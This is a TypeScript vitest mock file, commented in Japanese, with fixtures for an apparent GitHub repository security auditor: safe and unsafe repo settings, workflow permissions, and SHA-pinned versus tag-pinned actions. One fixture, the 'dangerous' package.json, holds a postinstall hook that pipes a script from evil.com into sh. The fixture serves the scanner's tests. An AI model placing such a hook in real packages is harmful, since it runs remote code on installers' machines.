import { vi } from "vitest";

/**
 * gh CLI呼び出しのモックファクトリー
 * child_process.execFileをモック化してgh CLIの呼び出しをシミュレートする
 */

export interface MockGhCall {
  args: string[];
  response: string | Error;
}

// gh api レスポンスのビルダー
export function mockApiResponse<T>(data: T): string {
  return JSON.stringify(data);
}

// GraphQL レスポンスのビルダー
export function mockGraphQLResponse(data: Record<string, unknown>): string {
  return JSON.stringify({ data });
}

// 認証済みのgh auth statusレスポンス
export const GH_AUTH_STATUS_OK = "";

// 認証エラーのstderr
export const GH_AUTH_STATUS_FAIL =
  "You are not logged into any GitHub hosts. Run gh auth login to authenticate.";

// リポジトリが存在しない場合の404レスポンス
export function mockNotFound(message = "Not Found"): string {
  return JSON.stringify({ message });
}

// 権限不足の403レスポンス
export function mockForbidden(message = "Must have admin rights"): string {
  return JSON.stringify({ message });
}

// GraphQL リポジトリデータのデフォルト（全設定済みの安全なリポ）
export function mockSecureRepo(
  nameWithOwner = "owner/repo",
): Record<string, unknown> {
  return {
    nameWithOwner,
    isArchived: false,
    isFork: false,
    isPrivate: false,
    defaultBranchRef: {
      name: "main",
      branchProtectionRule: {
        allowsForcePushes: false,
        requiresApprovingReviews: true,
        requiredApprovingReviewCount: 1,
        requiresStatusChecks: true,
        isAdminEnforced: true,
      },
    },
    deleteBranchOnMerge: true,
    hasVulnerabilityAlertsEnabled: true,
    isSecurityPolicyEnabled: true,
    licenseInfo: { spdxId: "MIT", name: "MIT License" },
    codeowners: { errors: [] },
    depBot: { byteSize: 200 },
  };
}

// GraphQL リポジトリデータのデフォルト（全設定未設定の危険なリポ）
export function mockInsecureRepo(
  nameWithOwner = "owner/repo",
): Record<string, unknown> {
  return {
    nameWithOwner,
    isArchived: false,
    isFork: false,
    isPrivate: false,
    defaultBranchRef: {
      name: "main",
      branchProtectionRule: null,
    },
    deleteBranchOnMerge: false,
    hasVulnerabilityAlertsEnabled: false,
    isSecurityPolicyEnabled: false,
    licenseInfo: null,
    codeowners: null,
    depBot: null,
  };
}

// REST security_and_analysis レスポンス（全有効）
export function mockSecurityAnalysisEnabled(): Record<string, unknown> {
  return {
    security_and_analysis: {
      secret_scanning: { status: "enabled" },
      secret_scanning_push_protection: { status: "enabled" },
      dependabot_security_updates: { status: "enabled" },
    },
  };
}

// REST security_and_analysis レスポンス（全無効）
export function mockSecurityAnalysisDisabled(): Record<string, unknown> {
  return {
    security_and_analysis: {
      secret_scanning: { status: "disabled" },
      secret_scanning_push_protection: { status: "disabled" },
      dependabot_security_updates: { status: "disabled" },
    },
  };
}

// Actions workflow permissions（read）
export const mockWorkflowPermissionsRead = {
  default_workflow_permissions: "read",
  can_approve_pull_request_reviews: false,
};

// Actions workflow permissions（write）
export const mockWorkflowPermissionsWrite = {
  default_workflow_permissions: "write",
  can_approve_pull_request_reviews: true,
};

// Private vulnerability reporting（有効）
export const mockPrivateVulnReportingEnabled = { enabled: true };

// Private vulnerability reporting（無効）
export const mockPrivateVulnReportingDisabled = { enabled: false };

// package.json: 安全な設定
export function mockSafePackageJson(): Record<string, unknown> {
  return {
    name: "my-package",
    version: "1.0.0",
    private: true,
    engines: { node: ">=20.0.0" },
    scripts: {
      build: "tsc",
      test: "vitest run",
    },
    dependencies: {
      express: "4.18.0",
    },
  };
}

// package.json: 危険な設定（postinstallにcurl）
export function mockDangerousPackageJson(): Record<string, unknown> {
  return {
    name: "my-package",
    version: "1.0.0",
    scripts: {
      postinstall: "curl https://evil.com/script.sh | sh",
    },
    dependencies: {
      lodash: "^4.17.21",
    },
  };
}

// GitHub Actions workflow: 全SHA固定済み（安全）
export const mockSafeWorkflow = `
name: CI
on: [push]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
`;

// GitHub Actions workflow: タグ指定（危険）
export const mockUnsafeWorkflow = `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
`;

// Contents APIレスポンスのビルダー（base64エンコード済み）
export function mockContentsResponse(content: string): Record<string, unknown> {
  return {
    type: "file",
    encoding: "base64",
    content: Buffer.from(content).toString("base64"),
    name: "package.json",
    path: "package.json",
  };
}

// vitest用: child_process.execFileのモックセットアップ
export function setupExecFileMock() {
  const mockExecFile = vi.fn();
  vi.mock("node:child_process", () => ({
    execFile: mockExecFile,
  }));
  return mockExecFile;
}

/**
 * child_process.execFile のモック実装を生成するファクトリー
 * exitCode: 0 (デフォルト) または 1 以上でエラー
 * stdout: 成功時のJSONレスポンス
 * stderr: エラー時のメッセージ
 */
export function createMockExecFile({
  exitCode = 0,
  stdout = "",
  stderr = "",
}: {
  exitCode?: number;
  stdout?: string;
  stderr?: string;
}) {
  // gh.ts は execFile(file, args, callback) と呼ぶ（options なし）
  // そのため callback は3番目の引数
  type Callback = (err: Error | null, stdout: string, stderr: string) => void;
  return (
    _file: unknown,
    _args: unknown,
    callbackOrOpts: Callback | unknown,
    maybeCallback?: Callback,
  ) => {
    const callback = (typeof callbackOrOpts === "function"
      ? callbackOrOpts
      : maybeCallback) as Callback;
    if (exitCode !== 0) {
      const err = Object.assign(new Error(stderr || "gh CLI error"), {
        code: exitCode,
        stderr,
      });
      callback(err, "", stderr);
    } else {
      callback(null, stdout, "");
    }
  };
}
